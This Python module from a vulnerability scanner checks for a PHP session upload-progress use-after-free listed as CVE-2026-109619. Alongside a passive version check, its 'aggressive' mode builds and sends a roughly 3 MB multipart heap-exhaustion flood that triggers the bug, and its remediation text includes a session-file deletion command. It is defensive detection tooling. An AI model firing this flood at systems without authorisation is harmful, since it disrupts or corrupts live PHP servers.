from __future__ import annotations

import re
import socket
from typing import Any

from ...core.categories import VulnerabilityType
from ...core.models import Confidence, Finding, Status
from ...core.transcript import attach_transcript, make_entry
from .php_2026_memory import classify_version as _classify_version
from .php_2026_memory import metadata as build_metadata
from .php_2026_memory import runtime_finding

CVE_ID = "CVE-2026-109619"
NAME = "PHP request shutdown residual-state use-after-free"
RULE = "PHP 8.2 before 8.2.35, 8.3 before 8.3.36, 8.4 before 8.4.27, and 8.5 before 8.5.12; legacy branches require package verification"
TYPE = VulnerabilityType.MEMORY_CORRUPTION
HAS_EXPLOIT = True
EXPLOIT_MODES = ["aggressive"]

# Flood geometry from the research unit: 995 ~3 KB fields (~3 MB) plus a NUL
# PHPSESSID field, an upload-progress field and a small file part. With the
# lab's 8 MB limit and 1 MB session.cookie_path this exhausts the heap
# during request startup on affected builds, leaving residual session state
# that kills the next upload-progress request's connection. Fixed builds
# reset the globals and answer it cleanly.
FLOOD_TOTAL = 3000000
FLOOD_FIELDS = 995
BOUNDARY = b"B" * 10


def classify_version(version: str | None) -> str:
    return _classify_version(version)


def _raw_exchange(host: str, port: int, request: bytes, timeout: int, read_cap: int = 1 << 20) -> dict[str, Any]:
    """Send a raw HTTP/1.0-style request; return a response-like mapping.

    Raw sockets are required: the lab's 1 MB session.cookie_path makes the
    Set-Cookie header larger than http.client's 64 KB header limit, so the
    standard client cannot parse these responses at all.
    """
    response: dict[str, Any] = {"status": 0, "body": "", "headers": {}}
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        response["error"] = {"type": type(exc).__name__, "message": str(exc)}
        return response
    try:
        sock.sendall(request)
        data = b""
        while len(data) < read_cap:
            try:
                chunk = sock.recv(65536)
            except OSError as exc:
                response["error"] = {"type": type(exc).__name__, "message": str(exc)}
                break
            if not chunk:
                break
            data += chunk
    finally:
        try:
            sock.close()
        except OSError:
            pass
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    try:
        response["status"] = int(lines[0].split(b" ", 2)[1])
    except (IndexError, ValueError):
        response["status"] = 0
    headers: dict[str, list[str]] = {}
    for line in lines[1:]:
        if b":" in line:
            key, value = line.split(b":", 1)
            headers.setdefault(key.decode("latin-1").strip().lower(), []).append(value.decode("latin-1").strip())
    response["headers"] = headers
    response["body"] = body.decode("utf-8", errors="replace")
    return response


def _set_cookie(headers: dict[str, Any]) -> str | None:
    for value in headers.get("set-cookie", []):
        match = re.match(r"PHPSESSID=([^;]*)", value)
        if match:
            return match.group(1)
    return None


def _build_flood() -> bytes:
    per, rem = divmod(FLOOD_TOTAL, FLOOD_FIELDS)
    parts = b""
    for i in range(FLOOD_FIELDS):
        parts += (
            b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="p%04d"\r\n\r\n' % i
            + b"B" * (per + (1 if i < rem else 0)) + b"\r\n"
        )
    parts += (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n\x00\r\n'
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
        b"Content-Type: text/plain\r\n\r\n" + b"A" * 64 + b"\r\n"
        b"--" + BOUNDARY + b"--\r\n"
    )
    return (
        "POST /sess.php HTTP/1.1\r\nHost: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        f"Content-Length: {len(parts)}\r\nConnection: close\r\n\r\n"
    ).encode() + parts


def _build_minimal() -> bytes:
    parts = (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\nattacksessionid0001\r\n'
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
        b"--" + BOUNDARY + b"--\r\n"
    )
    return (
        "POST /sess.php HTTP/1.1\r\nHost: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        f"Content-Length: {len(parts)}\r\nConnection: close\r\n\r\n"
    ).encode() + parts


def _build_get(path: str = "/sess.php") -> bytes:
    return f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode()


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Fire the OOM flood, then a minimal follow-up, then a benign control.

    Lab-only: the flood leaves residual session state on affected builds, so
    the follow-up upload-progress request's connection dies without a byte
    while the fixed build answers it cleanly (fresh Set-Cookie). The benign
    control proves the worker is still alive, ruling out "server down"
    false positives. No valid code pointer is planted; nothing executes.
    """
    del proxy  # loopback lab only; the probe opens raw sockets, never a proxy
    from urllib.parse import urlsplit

    base = target_url.rstrip("/")
    host = urlsplit(base).hostname or "127.0.0.1"
    port = urlsplit(base).port or 80
    sock_timeout = max(timeout, 60)

    baseline = _raw_exchange(host, port, _build_get(), sock_timeout)
    if baseline.get("status") != 200 or "SID=" not in str(baseline.get("body", "")):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The lab baseline endpoint /sess.php did not answer with a session identity. "
                "The OOM-gate differential needs the labs/cve-2026-109619 app; no payload was sent."
            ),
            action="Serve the labs/cve-2026-109619 app (session_start echo) and retry in an isolated lab.",
            evidence={"baseline_status": baseline.get("status")},
            vulnerability_type=TYPE,
        )

    flood = _raw_exchange(host, port, _build_flood(), sock_timeout)
    followup = _raw_exchange(host, port, _build_minimal(), sock_timeout)
    control = _raw_exchange(host, port, _build_get(), sock_timeout)

    followup_dead = followup.get("status", 0) == 0
    control_alive = control.get("status") == 200
    evidence = attach_transcript(
        {
            "flood_status": flood.get("status"),
            "flood_bytes": len(_build_flood()),
            "followup_status": followup.get("status"),
            "followup_error": (followup.get("error") or {}).get("type")
            if isinstance(followup.get("error"), dict)
            else None,
            "followup_cookie_len": len(_set_cookie(followup.get("headers", {})) or ""),
            "control_status": control.get("status"),
            "single_worker_lab": True,
        },
        [
            make_entry("GET", f"{base}/sess.php", baseline),
            make_entry("POST", f"{base}/sess.php", flood),
            make_entry("POST", f"{base}/sess.php", followup),
            make_entry("GET", f"{base}/sess.php", control),
        ],
    )

    if followup_dead and control_alive:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/sess.php",
            detail=(
                "After the OOM-shape flood, the follow-up upload-progress request's connection "
                "died without a response byte while the benign control answered HTTP 200 on the "
                "same single worker. The fixed build answers the follow-up cleanly with a fresh "
                "Set-Cookie. This confirms CVE-2026-109619 residual session state without executing anything."
            ),
            action=(
                "Upgrade PHP to the fixed branch release (8.2.35/8.3.36/8.4.27/8.5.12). "
                "For EOL branches, verify the vendor package changelog or binary backport. "
                "Remove lab session files (docker exec <web> rm -f /tmp/sess_*)."
            ),
            evidence=evidence,
            vulnerability_type=TYPE,
        )
    if not control_alive:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.LOW,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                f"The benign control request answered HTTP {control.get('status')} instead of 200, "
                "so the lab worker may be down; the differential is unreadable."
            ),
            action="Restart the lab stack and retry; confirm /sess.php answers 200 first.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="PHP runtime",
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            f"The follow-up request survived with HTTP {followup.get('status')}. "
            "That is the fixed-build behavior: residual state was reset."
        ),
        action="No action required if the runtime is at or beyond the branch-specific fixed release.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    php_runtime: dict[str, Any] | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, aggressive_command, aggressive_args
    passive = runtime_finding(
        cve=CVE_ID,
        name=NAME,
        vulnerability_type=TYPE,
        rule=RULE,
        action="Upgrade PHP to the fixed branch release. For EOL branches, verify the vendor package changelog or binary backport before classifying the installation.",
        php_runtime=php_runtime,
    )
    passive.exploit_available = HAS_EXPLOIT
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE needs the lab-only OOM-gate differential (aggressive: one worker is stressed)."
        return passive
    if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        passive.detail += " Aggressive proof skipped because the PHP version was not potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    meta = build_metadata(
        cve=CVE_ID,
        name=NAME,
        vulnerability_type=TYPE,
        rule=RULE,
        references=["https://www.php.net/", "https://nvd.nist.gov/vuln/detail/CVE-2026-109619"],
    )
    meta["exploit_available"] = HAS_EXPLOIT
    meta["exploit_modes"] = EXPLOIT_MODES
    meta["intrusive"] = True
    return meta
